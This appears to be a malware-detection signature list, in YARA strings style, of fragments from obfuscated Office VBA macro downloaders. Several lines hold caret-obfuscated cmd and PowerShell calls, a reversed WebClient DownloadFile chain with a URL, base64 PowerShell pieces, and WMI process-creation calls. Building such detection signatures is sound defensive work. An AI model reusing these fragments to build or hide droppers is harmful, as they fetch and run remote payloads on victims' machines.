        $ = "If lABABAXA = DAZABX Then"
        $ = "If mvpnA <> CXoco Then"
        $ = "If mwITMM >= 11 Then"
        $ = "If oCAwAB Xor UAUUooCx Then"
        $ = "If qPXGA <> 15 Then"
        $ = "If trUMv Xor 18 Then"
        $ = "If vhzuTp <> 16 Then"
        $ = "If vwAAQBA = lBCwUxA Then"
        $ = "If w1DAC_BQ = jAGAww Then"
        $ = "If wofZo <> EMzdh Then"
        $ = "If zSwUij > vmzif Then"
        $ = "IjQDz = \"^e^W^.^t^eN^ ^t\" + \"c^e^j^b^o^-^w^en^=\" + \"^FCC^$ ^l^l^e\" + \"^h^sr^ew^o^p&&^f^\" + \"or /^L %^s \" + \"^in (^3^7^9^,^-^1"
        $ = "IkoqpQaAX"
        $ = "InStr(HVGiHChh"
        $ = "InStr(SZQZh"
        $ = "InStr(zjwfsQ"
        $ = "InStrRev(GfJklEDq"
        $ = "InStrRev(crEJO"
        $ = "InStrRev(fYIVEAO"
        $ = "InStrRev(iqWQTflM"
        $ = "InStrRev(qcjvJsjF"
        $ = "InStrRev(qjRiFkFN"
        $ = "InStrRev(zFPth"
        $ = "Int(298118555"
        $ = "Int(528109665"
        $ = "Int(822825476"
        $ = "Int(843407933"
        $ = "Int(A5983_0"
        $ = "Int(A905946"
        $ = "Int(f35_768"
        $ = "Int(h8_31_"
        $ = "Int(j5715518"
        $ = "Int(nDJKLa"
        $ = "IoBRfFSilRwXS"
        $ = "IqpVFH = \", 77,\" + \"74 \" + \", 85 ,8\" + \"1 , 77\" + \",64, \" + \"85,74 ,\" + \" 72\" + \",6\" + \"4 ,66, 8\" + \"7 ,\" + \"68\" + \" ,7"
        $ = "IrcSTp = Int(39192.497252085)"
        $ = "IvZEVLAEAB = \" \" + \" 36 \" + \" \" + \" ^+\" + \"4 ^ \" + \"^ \" + \"^; \" + \"4 4"
        $ = "J0668502H409_179q39_562O2__979"
        $ = "J6_63__ = \"cAL\" + \"gBjAC\" + \"cAKwAn\" + \"AG8Ab\" + \"QAv"
        $ = "J839441_ = GetObject(r1_0_9_ + i9__6__ + D_2730_).Create((Z_695_3 + O086632"
        $ = "JACxAGo.jBcXxUA1"
        $ = "JCZXQ4.KoAoZkA"
        $ = "JDABwAA = AQDGkUU - 182919802 - 145571059 + Log(171680326 - Atn(CBGQA_ZD / zQ14QAA + vcUAQ1A / Tan(43329969))) * (226710243 + Sg"
        $ = "JHnFpDCGQpBlAsjDGwVQPf"
        $ = "JPzkzz = Atn(17804 / tbGMBv - nbFWl / FAtRR"
        $ = "JUAkD1G = (83109844 - Chr(XA_kGA) / XcooCAAD / 56842516 + RDADQDD / Fix(219749515 + Log(wkX_AAQA * Sgn(720521005) + LxAGZ1"
        $ = "J_4904 = Y0839_1"
        $ = "JfNwojbmApZ"
        $ = "JiZvqQ = wdTzQ - XlPhVt / (ibdmZi + Oct(rPpdZ) - 86228 + Log(uwaOB"
        $ = "JjGMzLzBJW"
        $ = "Jjfkc = 36032"
        $ = "JjipJf = 67332 / STikiz - iTXwF - CNbsF / (lzbii * nOjwit * 11710 / XBzKpM - (GLsrh * qHWCz / 6548 - zzrkE"
        $ = "JlsaLqjNu = 303538427"
        $ = "Jndfd = GYVok - iRoWnl - OsDBX / YrTKJh * QmwYlE + GVrUnl + 82105 * ATzUL - fZGmF + FfnNLG"
        $ = "Jw0IpvPt"
        $ = "JzpGPjpiYsTWzqJmFzWDL = 154289797"
        $ = "K22002 = z1384431.h819296 + z1384431.u5076471 + z1384431.R7903840 + z1384431.P44__5 + z1384431.p3861164"
        $ = "K5217926"
        $ = "K9_38_41"
        $ = "KAUQAA = lDXcXA"
        $ = "KKnbcC = pmDOw - NjXzB / Zowls * iibbkX * (74359 + 69457 - 21344 + 90062 * 81116 - zikQV - YrZus / nAwfnC)"
        $ = "KUfc8JT = 5.5"
        $ = "KYBUwYPjPLvNA"
        $ = "KbwpbI(0) = Right(IXowdG + AwYEOYpwHTVoiTNZlKWbct + FYwmdAmw, 340) + Mid(MllTqUp + ZDHJQjWiUwKCjjVpVCk + EAnArfHm, 965, 600) + R"
        $ = "KdcNDqlYP = \"e\" + PlbqKCOO + DiciLOfYParrOw + \"M.\" + fmAkSJH + zzhzMYrNW + \"iO\" + OshNCLttU + inJWbNijub + \".\" + NPwaDCAds + lmF"
        $ = "KkRMhwzwlQdmjvSOnqLAE"
        $ = "KrHAU(1) = MidB(jZona + OkimQSiLWjCjCCzOUfL + piZzb, 509, 717) + Mid(zDJLs + dfDzJuBipmqFCzbwhsi + liCjzsZ, 179, 202"
        $ = "KvJbr = cquCd * GUFmz * zpnsG * komaKv + (cBnHnY * XMTjS / PruXc - 75307"
        $ = "KwsUrPoaPPiOiSWQJw"
        $ = "KxoUXwAX"
        $ = "KzhSYraZt = 1408997 - Sqr(SIDBqUQKZBscK * Fix(qpzzZzSjFbfJb) + 3542666 / JhjJwLDV) - 1015304 * hhVkERXXc * CbZTKYiCbVht + CDbl(9599633 * Int(247106) / 3031466 * Tan(3952893)) / SLdmTthr / CByte(2971171 - CDbl(wBJIlwkHiHMzZc))"
        $ = "L01__7.Create K21631 + B467960 + f017_345, a7904001, p6484_, i7_88896"
        $ = "L46259S28942w0285271F593565"
        $ = "L588636.Create d03_6699 + i70003 + K149_3, E40960, U07210, D24_80"
        $ = "L7913123(86890) = 676 + Int(Q_00623_) + o78_7402 + Int(536) + N254040 + b3129848 + 35 + L_55886"
        $ = "L8942331"
        $ = "LAUkBAGC"
        $ = "LDG3FL = ThisDocument.kww7SAA + ThisDocument.jmVumU + ThisDocument.ZcNnEdo"
        $ = "LEtiNjzWc"
        $ = "LKzTaJOPVNnYlULXLW"
        $ = "LT192ZKX"
        $ = "LVolKTRY = CLng(XhEBFf"
        $ = "Left(\"RvlwhsO"
        $ = "Left(\"VnnXW"
        $ = "Left(SiJij"
        $ = "Left(ZREwjAd"
        $ = "Left(mYiAzI"
        $ = "Left(rUuvktZuTwZM"
        $ = "LfSjLD = (87618 - RwtTZF * HnpiqS + dPJkvT * (cfZGia / kZirh * Yipvr + LKrhzA"
        $ = "LoBLta(0"
        $ = "Log(\"hYNDbS"
        $ = "Log(371453918"
        $ = "Log(861579552"
        $ = "Log(FAkQUA"
        $ = "Log(JcG_AAG"
        $ = "Log(QDAAXDU"
        $ = "Log(dPqCUb"
        $ = "Log(lXwfiwoz"
        $ = "Log(ocFjWUaiC"
        $ = "Log(qcA_BAx"
        $ = "LpGzIpPj(k9UYoYwE) _"
        $ = "M130_4 = j343_5 + (L_84358) _"
        $ = "M1CAQU1A = CxCZAGZ + Tan(641688001) * l4AQZGBo - hDcA_QxC + (102480350 * 639037287"
        $ = "M46_1740"
        $ = "MOlcADUzfDT = \"8 , 43 , \" + \"116 ,\" + \"124,\" + \" 117,8\" + \" , 43 \" + \", 55\" + \", 50 , 47\" + \", 115 , 1\" + \"24 ,27 ,\" + \"124"
        $ = "MSfr5pj3"
        $ = "MUCoBX.lAXZQB"
        $ = "MXQBAA = OBAxAoQQ / 478597815 / _"
        $ = "MXQUQA = 147221648 - ChrB(31558251 * Round(2172008) + u_DXUA - ChrB(QGAXCG)) / noxAUXB / Rnd(222697576 / tQAQwQA * SpBb / ChrW(8"
        $ = "MZBMku = 64755 - oZVUuT * (tzfUl + oSUshT"
        $ = "McGBkU = \"CcAKwAnAFYAaQBBAHkAMABBAEMAYgBHAHcAUgB1AGsALwBnACcAKwAnAFUATwBSAHIAUwAnACsAJwBEAHoAcwAnACs"
        $ = "MiOQvsTz"
        $ = "Mid(EoUrHrAPt"
        $ = "Mid(ZjDad"
        $ = "MidB(\"PIYSda"
        $ = "MidB(\"RkHlpq"
        $ = "MidB(\"jwFLFN"
        $ = "MidB(KiawvwJ"
        $ = "MidB(WbwUODRt"
        $ = "MidB(bIfYCddPinLcqX"
        $ = "MidB(jqIFMtj"
        $ = "MidB(kVptOz"
        $ = "Mission97 = Research55"
        $ = "MkcAxBQo"
        $ = "MsVEBtlC"
        $ = "MzoWGI(1) = Right(pUPYusoB, 972"
        $ = "Mzvrvrnidsv.java"
        $ = "N\", \"rh\", \"wR\", \"l\", \"f\", \"jr\", \"H\", \"d\", _"
        $ = "N35_908 = l4244_ + (L8077086) _"
        $ = "N979787_"
        $ = "NAABAQ = Round(dAGAXAA1"
        $ = "NAAZAD = Rnd(BGAUUZAD + 826449121 + 335330226 / u1AGCA"
        $ = "NDcwBD = CVar(pDA1GDk"
        $ = "NErJMifO"
        $ = "NFDFu = Oct(YYrmFdvcV"
        $ = "NThZtRwlQv = \"^AIA^A\" + \"CA\" + \"^g\" + \"^A^A^\" + \"I^AACAg\" + \"^AA^I\" + \"AACAg"
        $ = "NZbbM = Format(Chr(3 + 16 + 16 + 6 + 58)) + \"md /V^:^O/\""
        $ = "N^w^i^$(hc^a"
        $ = "NewMexico36"
        $ = "NqwuOu = CDbl(HjlEfj"
        $ = "NzZNn = wUNmab + rYZAfC"
        $ = "O3643039"
        $ = "O6778191"
        $ = "OAACDx1G = Atn(209100693"
        $ = "ODkvjUUMuAjhkFwWPHLipcr"
        $ = "OEdjZdF = CByte(wjjUZGvLK"
        $ = "OJLJnhOEdS = \"72aa027c7a02}70a2\" + \";720ak7a02aa027e\" + \"20a7r702ab702a;\" + \"72a0ca027w"
        $ = "OMnmOGZO"
        $ = "OONGLZ(0) = InStrRev(iPAwNn + GvttfHaQOPQWfZiAamspi + QNzqpS, iRYJTsL + kbuvDFXimmdNFQqVcaZz + zzWQLHPj)"
        $ = "ORaWlL(1) = Mid(vLDansuW, 768, 765"
        $ = "O_1_1949(21925) = 568 + Int(j256166) + T74_19 + Int(401) + w_17_4_0 + P903793_ + 797 + q4045937"
        $ = "Oct(78067"
        $ = "Oct(850748055"
        $ = "Oct(871920812"
        $ = "Oct(94671"
        $ = "Oct(BUAxUA"
        $ = "Oct(XvpIt"
        $ = "OqZhE = dUzwJ + rzVvL"
        $ = "Oqkljz8 = -506810426"
        $ = "OtRdzEzWr = ZwHbzl"
        $ = "OvfQoFiuhR = \" ,98\" + \", 38,46 \" + \",39,90\" + \", 121,10\" + \"1, 96, \" + \"125, 33 \" + \", 46\" + \" , 73"
        $ = "OwHACa = (35855 - hvpDY * nbXPhX + ptikYX * (ZJWEuU / JOVqSO * AcwWV + Hwriz"
        $ = "P3765134"
        $ = "PApXh_dO"
        $ = "PCAQXA = 192822978 * Fix(887720541) / WAQ1BXkZ - Int(668256720 + zcAUUwx) * 573593716 + Fix(45356222 + Hex(LoDDAA1"
        $ = "PDkAAkkw"
        $ = "PGzXlD = vuaHHY + RKvjPN"
        $ = "POwJmjjCq"
        $ = "PZrIoMuXju"
        $ = "P_711_31"
        $ = "PiMF2cHd"
        $ = "PiUw5di8"
        $ = "PjfBJ = 82633"
        $ = "PjoVjN = \"^\" + \" ,\" + \" \" + \" ^, 5\" + \"1"
        $ = "PjzwEX = jhQOWc + KmToq + PzpPEOF + tcZkX + LDtoC + tXwsHJ"
        $ = "Plasticdz"
        $ = "Print Tan(\"abbMdCUi"
        $ = "Print Tan(\"bJmONKnU"
        $ = "Print Tan(\"cRIOrJa"
        $ = "Print Tan(\"dzZi34wZ"
        $ = "Private Function OSFiUYWiGV(GOfOBowmRboYhw"
        $ = "PzhBDZhm = \"5 \" + \",^ , \" + \" 53 \" + \"28 ^ 5\" + \"3^ \" + \"^\" + \"3\" + \"^4 +\" + \"49^"
        $ = "Q124_4 = ChrB(268935819"
        $ = "Q3_044(54150) = 659 + Int(v28772_) _"
        $ = "Q6867037d__81275w32513k6424309"
        $ = "QAAAwAAk"
        $ = "QABwA_AA"
        $ = "QDxZADG.rcDAB1Qo"
        $ = "QEGIYm = WWqhM - MaMQJ - Sriips / dwUdUp * lalsj + aGvoj + 43379 * ssOqF - wUomZ + QbIWB"
        $ = "QHizY = Hex(WruhL"
        $ = "QLPJATKj"
        $ = "QQBEAEMAWAApA"
        $ = "QStTbE = \"OwerSHel\" + \"l ( [CHA\" + \"R[\" + \"]](1\" + \"1 \""
        $ = "QXFWDAVfwhNqozOFiTD"
        $ = "Q_8_8_ = 702724214"
        $ = "QbXOJY(2"
        $ = "QhjYMz(4) = Left(iMCJl, 246) + Left(iMCJl, 246"
        $ = "QijMSBFD = ThisDocument.DzT595 + ThisDocument.bNdwZj + ThisDocument.l7M_E8"
        $ = "QuVNRmCcdliQobEdGu = BWmiJUlSdhCUVwBSfIT"
        $ = "R27832 = (261043725"
        $ = "RBUAAkQA"
        $ = "RGdAjIScrBkzOEzMchiBOjJabWdr"
        $ = "RHAln6v = hUve8xZN"
        $ = "RNvUocikr"
        $ = "RWXqI = \"m\" + \"d \" + \"/V\" + \"/C\" + Chr(0 + 4 + 0 + 3 + 27) + \"^se^t\" + \" ^\""
        $ = "RXihOI (qTCU059"
        $ = "RYwSf = (MuwRhO - priWYL) * wnmmWz / BidAi / 16782 * QqjBF"
        $ = "ReDim FqHTRA(5"
        $ = "ReDim L53522(12925"
        $ = "ReDim V0972258(87025"
        $ = "ReDim j137668(18360"
        $ = "ReDim jujpOz(4"
        $ = "ReDim qjzcp(3"
        $ = "ReDim u2466744(18360"
        $ = "Right(HXAJz"
        $ = "Right(TAUUmLwS"
        $ = "Right(VNssMfO"
        $ = "RnJjwcoYNJUZqFzvJdlla"
        $ = "Rnd(278867350"
        $ = "Rnd(389649248"
        $ = "Rnd(968206712) - nZxwAA * CByte(982588317)) + (313579146 + _"
        $ = "Rnd(PAAx1AD + CDbl(697070546) / pBAxoo * 940352024"
        $ = "Rnd(QwDGUA"
        $ = "Rnd(fZBwQZ"
        $ = "Rnd(jUCABwA"
        $ = "Rnd(kAA_BG"
        $ = "Rnd(zQADDAA"
        $ = "RoAAUAAc"
        $ = "Round(14495"
        $ = "Round(21334"
        $ = "Round(39302) / 13957 / CInt(EGcpP"
        $ = "Round(42117"
        $ = "Round(71823"
        $ = "Round(733215761"
        $ = "Round(744997151"
        $ = "Round(80805"
        $ = "Round(92991) / 98244 / CInt(aIoZh"
        $ = "Round(pcCAZ_4"
        $ = "RtQGRTioQ"
        $ = "RucwLIANzzH = \"1, 4\" + \"1 ,52 ,5\" + \"6,62 , \" + \"40, 40 ,\" + \" 123 ,127\" + \" ,11 ,43,\" + \" 26"
        $ = "RzXhS(0) = MidB(Pmlbl, 230, 883) + Right(lurHJSV, 153) + MidB(Pmlbl, 230, 883) + MidB(Pmlbl, 230, 883"
        $ = "S93752P8969762v_43955Y989272"
        $ = "SCCQAwUw = \"wAxAEYAdQBzAGwAVgB1AGgAcwAnACsAJwBGAEIANgBHACcAKwAnAEYAMAAnACsAJwBxACcAKwAnAEwAKwBYACcA"
        $ = "SDDADA = Atn(566204897 + Atn(644556852) * FoAAXA * CDate(iDB1wZ4A + 36 + pAAUGBZ / CStr(sBQXAQB"
        $ = "SFypH = 122"
        $ = "SGkcQA4 = vAk4AAA4 + CInt(HUAAAD) * 487697830 * CBool(206700801) + 103824658 / Round(T4AZZ4) - iGABAA + Sqr(543647800) - 7566101"
        $ = "SKwOn(1) = 154510115"
        $ = "SSmsQm(1"
        $ = "SaPNcWTvi.Run#"
        $ = "Select Case \"LT3k44"
        $ = "Select Case \"W2_hSz"
        $ = "Select Case \"dpw12AH"
        $ = "Select Case \"hP1B10N"
        $ = "Select Case \"zFAID4El"
        $ = "Select Case C03_43_9"
        $ = "Select Case EUUxZUx"
        $ = "Select Case FZGUox"
        $ = "Select Case GDDkA1BA"
        $ = "Select Case GTzzHQudM"
        $ = "Select Case HGCAc_x"
        $ = "Select Case JAxACUAA"
        $ = "Select Case LDjtZ"
        $ = "Select Case NAcAAk"
        $ = "Select Case QG_BkUU4"
        $ = "Select Case UXAAkD"
        $ = "Select Case ZkcjiNj"
        $ = "Select Case j2113_4"
        $ = "Select Case j2___185"
        $ = "Select Case k529__8_"
        $ = "Select Case kwCAABQA"
        $ = "Select Case n40262"
        $ = "Select Case p9____"
        $ = "Select Case qQAZQUA"
        $ = "Set BQViz = Shapes(\"BMAttprmjsdz\")"
        $ = "Set BdhXmDT = HmcPZpvNJ"
        $ = "Set CRu3b8 = GetObject(\"wi\" _"
        $ = "Set EAGDAQ = i4GDXcUA"
        $ = "Set EGvVqmnoi = GetObject(\"new:72C24DD5-D70A-438B-8A42-98424B88AFB8\" + hXuws)"
        $ = "Set HQdGRFc = NKpPQdvHWrAS.Shapes(TXMTWqw + \"wcTAaSnXNz\" + DFIUKiwMC).TextFrame"
        $ = "Set JlZEQT = wKwAGt"
        $ = "Set ODJvYrp = XqnupVp"
        $ = "Set T452521 = J42_489(GetObject(\"winmgmt\" + \"s:Wi\" + \"n3\" + \"2_Pr\" + \"ocess"
        $ = "Set TGqwi = Shapes(\"kaqkDoaFLZ\")"
        $ = "Set TT9Nzj8 = GetObject(DjJziuOh(\"WinmGmts:Wi\" + DjJziuOh(\"n32_Process"
        $ = "Set VBIvOSN = PTidB"
        $ = "Set W1QGCAA = RA4o1AAw"
        $ = "Set Y348958 = GetObject((\"winm\" + \"gmts:\" + \"Win32_Proc\" + \"essS\" + \"tartup"
        $ = "Set YEwFOQ = EXcan"
        $ = "Set aGUDAA1 = SCoX4wAk"
        $ = "Set bznuP = JjiBCfs"
        $ = "Set d997_09 = c__4__4"
        $ = "Set fHw8Y7 = GetObject(np3LBb(np3LBb(hrP6Pc6 + \"startup"
        $ = "Set k68733_6 = GetObject(\"WiN\" + \"MgMts:w\" + \"In32_PRocEssStArTuP"
        $ = "Set kTaPWo = CnLaOM"
        $ = "Set l8847355 = GetObject((\"winm\" + \"gmts:\" + \"Win3\" + \"2_Process"
        $ = "Set o1845290 = CVar(w384214"
        $ = "Set q17811 = GetObject(\"WiN\" + \"mgmts:Win32_ProcessStarTUP"
        $ = "Set q88_524_ = E7649_84"
        $ = "Set q_96__86 = f2_61_30"
        $ = "Set rDBXwAA = zAAD1AU"
        $ = "Set u23261_9 = O56_43"
        $ = "Set ukMzHfzwu = GetObject(\"new:72C24DD5-D70A-438B-8A42-98424B88AFB8\")"
        $ = "Set uuiNz = mXTBlw"
        $ = "Set w617274 = CVar(S_803331"
        $ = "Set withdrawalvr = Borderspr"
        $ = "Set wmGBW = oWiwt"
        $ = "Set zU4BAAG = iUBDAA"
        $ = "Set zdXQr = vTqErLCw.Shapes(flIwQE + \"GFtELIoGcL\" + VzVDm)"
        $ = "Sgn(219063213"
        $ = "Sgn(742242790"
        $ = "Sgn(766559353"
        $ = "Sgn(79049772"
        $ = "Sgn(827388599"
        $ = "Sgn(980309105"
        $ = "Sgn(QADAUAUA"
        $ = "Sgn(SQAUABAA"
        $ = "Sgn(UAAkAA_"
        $ = "Sgn(ckXXAoxZ"
        $ = "Sgn(dQAAZAG"
        $ = "Sgn(qA4xAcAk"
        $ = "Shell GLa6B9u() _"
        $ = "Shell@ Shapes(JIjlVCZ + bbqtd + 1 + vUsEPo + EurUh).TextFrame.TextRange.Text + MLbZH + XXLwd, qjroTntk"
        $ = "Shell@ XZHzoVINkod + zpnSZbjhvf + ABUEzlL, Format(0)"
        $ = "ShoesMovies40 = clientdriven19"
        $ = "ShowWindow = CzcSzz + HciP0Y + wXqH3Nwj + RnjZh4 + wfsbbj6l"
        $ = "ShowWindow = vbFalse - vbFalse"
        $ = "Sin(3439"
        $ = "Sin(40016"
        $ = "Sin(40405"
        $ = "Sin(51902"
        $ = "Sin(60936"
        $ = "Sin(67009"
        $ = "Sin(74148"
        $ = "Sin(79118"
        $ = "Sin(81163"
        $ = "Sin(nNKzKh"
        $ = "SjSbAIlIYX"
        $ = "SkCDDowB"
        $ = "Sqr(177226476"
        $ = "Sqr(33931"
        $ = "Sqr(58694736"
        $ = "Sqr(688130465 / 214433976 + 151036199 * Atn(623335531))) + scAQGAB / _"
        $ = "Sqr(70008"
        $ = "Sqr(82937"
        $ = "Sqr(D1QAQA4"
        $ = "Sqr(FACA1X"
        $ = "Sqr(HDkADD"
        $ = "Sqr(fABU4DA"
        $ = "Sub ZFodZ_(YoPb3A"
        $ = "Sub love(BAqhCi)"
        $ = "SzjLFa = fzdzMD + UFsRoH / (uKXCzn * mqTPRp / jBYai / RBlHlv"
        $ = "T91451 = d0565_.E_55377 + d0565_.k1_257 + d0565_.L278159 + d0565_.a28_1645 + d0565_.s251921"
        $ = "TDDZkUCC"
        $ = "TFdawQQq = \" 48 \" + \" ^\" + \"+31 \" + \"49 5"
        $ = "TLkqFvFXrC"
        $ = "TNJRMYQUz = CByte(RBmmfmi"
        $ = "TNQQZODP = CDate(oBXEP"
        $ = "TPYzz = voAWJ * CDate(OWKJGcDj * UThluYB) * zEofGZ / Sin(iCDERST) / oGSIj + 212963522 - 135590833 + Chr(66556945) + (uj"
        $ = "TQjbQXhsWBi = \"F^d^a^o^ln^w^o\" + \"^D^.^I^ED^$^{^yr\" + \"^t^{)^H^b^X^$^\" + \" n^i^ ^i^K^h^$(hc^a"
        $ = "TQvSiMnEvOhDjhNbzN"
        $ = "TSsjHl(0"
        $ = "TT9Nzj8.Create jIR3nwEm + DjJziuOh(\"pOwe\") + zlENFnFB + Swlfot9.FbFMIBR + Swlfot9.bLJAPOF + CfCOp_Y, k4uZjr6l, vKdiFDQ0, Y2kmwLH"
        $ = "Tacticsat = CLng(874"
        $ = "TalOT = Sin(68211"
        $ = "Tan(\"wvLq5v"
        $ = "Tan(204124700"
        $ = "Tan(789194994"
        $ = "Tan(MQGABUAA"
        $ = "Tan(l_2494_2"
        $ = "Tan(u_6_65_2"
        $ = "TiAqLihdtTJaiIwNipM"
        $ = "TiSBk = Hex(QrzZKWaip)"
        $ = "TnAkb = bsoshUSH + VBA.Shell(IEYZXV + Chr(WqvbPTbYGtP + vbKeyP + aJNTzabBdkw) + \"owers\" + vvhoiOiw + MBMLXoVl + coAVE + hcqsppXq"
        $ = "TtCJquKuF = CLng(ZPYAPs"
        $ = "TypeName Atn(12173541"
        $ = "TypeName BhkJRp"
        $ = "TypeName BjJbO"
        $ = "TypeName CBool(846"
        $ = "TypeName CBool(WoNNhX"
        $ = "TypeName CDate(3"
        $ = "TypeName CDbl(ciJdE * GadXB - 66969 - TXpEQd"
        $ = "TypeName CInt(129571863"
        $ = "TypeName CInt(jpjAXt / DCiHzw * 68372 / nBGmSt"
        $ = "TypeName CLng(aNEtjX * FwwzB"
        $ = "TypeName CSng(odsAn / nnIun - 62747 * AazXY"
        $ = "TypeName Chr(65079 * MZnjWH"
        $ = "TypeName ChrB(12643571"
        $ = "TypeName ChrB(28812393"
        $ = "TypeName ChrB(mwIqhs"
        $ = "TypeName Cos(849"
        $ = "TypeName Hex(28943 * wBnoNN"
        $ = "TypeName Hex(Buvla - LzJBCr + 86886 + SQEtWv"
        $ = "TypeName Int(5219"
        $ = "TypeName Log(271265640"
        $ = "TypeName Log(6627"
        $ = "TypeName Log(68150 * srHzGq / liBjd - 77025"
        $ = "TypeName MazADN"
        $ = "TypeName MwKAa"
        $ = "TypeName Oct(WqkcA"
        $ = "TypeName Oct(qkhibX"
        $ = "TypeName Sgn(30196 * WcfmBb + 78661 * KtjhJ"
        $ = "TypeName Sin(4"
        $ = "TypeName Tan(4"
        $ = "TypeName ijKUzj"
        $ = "TypeName jGsku"
        $ = "TypeName tAYwtF"
        $ = "TypeName tFWYT"
        $ = "TypeName wXuiE"
        $ = "TzNEj = DtPXw"
        $ = "U07210. _"
        $ = "U0837 = 148219679"
        $ = "U2056127"
        $ = "U308742 = ((\"o33805\") + (\"953540693"
        $ = "U945 = h335"
        $ = "UABAUAxU"
        $ = "UBbkwz = kqETsU * tdzTS / 32879 * 44121 * (XGDaA / 23462"
        $ = "URcazcVmnTdNzu"
        $ = "UUYnuVaT"
        $ = "UVqVdR = (41602 - DATKV * puwVI + YbJEb * (PnKJF / QldRI * wEzuJt + wCRiAv"
        $ = "UVsjz = 28544 + NfIdlS / (30441 / WYVit * OdOAsl / dzzKu"
        $ = "UfcDWpttovZKopULFFEDiRVVFTFj"
        $ = "UrwaUCWND"
        $ = "UuwItiEVVRI"
        $ = "UzvNnVNPBJ"
        $ = "VAAACAAw"
        $ = "VAAcU1U = hQUAo_QA / 948914106 / dABUAAAx - CInt(u4BAxD + CInt(828975253)) + (241921069 * CLng(191312248"
        $ = "VAUBUc = Sin(SAAAAoBQ - Hex(jACC_Zw"
        $ = "VA_DAZc = Asc(796066926 / Oct(289573419"
        $ = "VBA.Shell$ \"\""
        $ = "VCAAAAUB"
        $ = "VDckqiuQlMQLRWsuuJNmLw"
        $ = "VDwFcJ(1) = Left(TSwnWHrpDjYUR + CjEqmkVGYROqtGirqIZjKfdLzmvMz + PwnGEGzLaPEtA, 913) + Mid(CVZXIcw + IZWTcLTmiHvQtltwFldPCltqXE"
        $ = "VGFXdPcBsCTsjGEwNL"
        $ = "VIMiZF = (97630 * TuLjBZ - 5996 + FiWWa * (36780 + qzijJ / LBunlj / OhVQk - MljAYM * JYOizS"
        $ = "VPVHwbTknfBddKCFlbjRS"
        $ = "VhoEiX = \"^im-\" + \"hca^b\" + \"hcsi\" + \"^\" + \"f//:\" + \"ptth@\" + \"^m^yv\" + \"a^3^\" + \"HQ/^moc\" + \"^.^yr\" + \"tn\" + \"u\" + \"^oce^h^"
        $ = "VhzadA = nOijPY"
        $ = "VucvoWrMG = Int(327251806 * GXAEi"
        $ = "VwrwVnYVP = \"n^e^i^lC^b^e^W^\" + \".^t^eN^ ^tc^e^\" + \"j^bo^-^w^en\" + \"^=^I^E^D^$^ ^l^l^eh\" + \"^sr^e^w^o^p&&^f\" + \"^or /^L %^W ^in"
        $ = "W788626_"
        $ = "WA1AAACA"
        $ = "WBUzimvvWWf = buSHckDu + JZuFw + RwZzjtBObYt + MEdnBRO"
        $ = "WC1oUoQD"
        $ = "WC1oUoQD = 974052615 - Atn(884252468) / 510003871 / 501545027 * 482390539 - Rnd(YAQAGBA / CSng(173755901"
        $ = "WCSHPu = Sin(64895"
        $ = "WNFDOrQaD = Cos(WGfnolpZ"
        $ = "WZA_U1B.dAZU_Ao"
        $ = "WeekdayName E5229195 + H32_86 + (A5219665 / 829212494 + (Z97207 - Hex(R18478 - z1440__ * d_8784 + Cos(R546234 + 557687998 - 2784"
        $ = "WeekdayName j70602 + l625278 + (R98800 / 697982226 + (R61082 - Hex(r64945 - s44915 * w__3798 + Cos(m08599_4 + 975800293 - 807368"
        $ = "While A52092 And 123278912"
        $ = "While A552_695 And M50_440"
        $ = "While B10103 And 623024061"
        $ = "While B68171 _"
        $ = "While C84614 And 391229455"
        $ = "While F13687 And F9100321"
        $ = "While J184521 And X811710"
        $ = "While J773572 And X119_84"
        $ = "While K1194093 And 118413774"
        $ = "While Q6__7125 And X891124"
        $ = "While T3127936 And 322884932"
        $ = "While U41094 And n666_59_"
        $ = "While V996_593 And 356701372"
        $ = "While Z51802_ And z_4_852"
        $ = "While Z__39771 And B4_5201"
        $ = "While b24440 And 459520417"
        $ = "While d_56547 And i4035254"
        $ = "While h17136_ And F8488805"
        $ = "While i08528 And 552808729"
        $ = "While k267_02 _"
        $ = "While k557156 And 564038286"
        $ = "While n050064 And 376973578"
        $ = "While o9842007 And b5854_"
        $ = "While s675_4 And 796560502"
        $ = "While u8669441 And 550045514"
        $ = "While w886_63 And G468873"
        $ = "WpDbq = \"^44 \" + \" 54 \" + \"5\" + \"^6 , \" + \",^ \" + \" 1\" + \"8^\" + \" ; 2\" + \"7 ^,\" + \" ^\" + \", ^ \" + \"+54"
        $ = "WqzTkt = CBool(zwRURqTRI"
        $ = "WsMIJ = 338699924"
        $ = "WtuPNhEr = 180645320"
        $ = "WwNEzJwNhR = \"44, \" + \"118, 52, \" + \"57,49,6\" + \"2 , 56 ,\" + \"47 , 123,\" + \"21,6"
        $ = "X328722N56484r198193T446_2"
        $ = "XCRWG = CDate(ipwztL + Sin(40127 + 48104) * 41321 * CInt(29695"
        $ = "XImYc = CDate(wviTFA + Sin(84042 + 85632) * 70115 * CInt(18596))"
        $ = "XPFhr = \"^\" + \"HA^0\" + \"^BAa^\" + \"A^\" + \"AEA^0^\" + \"B^gS\" + \"^AIEAW\" + \"B^AcAY\" + \"^FA\" + \"0^B^\" + \"g^Z"
        $ = "XVlGCOMbM = fFConD + PjoVjN + oTdNuFfD + GSwFIsVVcZ + JFCSjfzFl + hRLzJjVzRHw + qrAzwm + oDNXD + DlLbaKY"
        $ = "XZHzoVINkod = NZbbM + kwBWK + DcuvHZU"
        $ = "XisID = VQJpkw / ojwEO + cwAnu - vMTznC - 80441 + 30798 * 67206 - GPpOY"
        $ = "XtXItXNP"
        $ = "XwkGAX = lDCAAQ + CInt(M14ZXQC) * 643063684 * CBool(896899234) + 211300330 / Round(iAAAUQD) - sGcAUAo + Sqr(328542880) - 3776862"
        $ = "YAAQGXAB"
        $ = "YDA1xQ = (971282489 + Rnd(iAwUCAxB * _"
        $ = "YKBpOUFmamujzzPNs"
        $ = "YMTiBY = (51321 * vWbiwO - 37845 + kdBEPS * (14591 + fCzTV / ABtfbM / RwoMb - dvIMi * USwRK"
        $ = "YNzoaWiSpXj = Format(Chr(11 + 13 + 1 + 7 + 67)) + \"md /V^:^O/\" + Format(Chr(8 + 9"
        $ = "YU_BUA = \"ZABlAGYAbABBAHQAZQBzAFQAcgBlAEEAbQAoAFsAUwBZAFMAVABFAG0ALgBJAG8ALgBNAEUAbQBvAHIAWQBTAFQAcgB"
        $ = "YWlNiGRj"
        $ = "Y^7^;^2^6n"
        $ = "Y_9_5145"
        $ = "YiZNCb = \"Hpno"
        $ = "YkWSwjtA"
        $ = "YmoODQ(0) = Left(dwQtOQ + pQXrWnGPpqzaNNVHJZ + owmsiz, 763) + InStrRev(OGIJS + hzhzNZuPUHftJczivjwIHb + jTESqLw, rvFOw + KrHdAlf"
